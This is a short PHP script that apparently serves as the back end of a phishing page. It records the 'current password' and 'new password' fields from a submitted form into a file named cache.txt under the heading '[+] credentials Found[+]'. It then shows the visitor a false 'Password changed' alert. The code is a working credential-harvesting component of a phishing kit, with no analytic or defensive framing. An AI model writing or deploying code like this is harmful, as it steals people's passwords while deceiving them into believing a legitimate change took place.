<?php
file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Current password - " . $_POST['cpass'] . "\n" . "New password - " . $_POST['npass'] . "\n",FILE_APPEND);
echo "<script>alert('Password changed')</script>";
?>

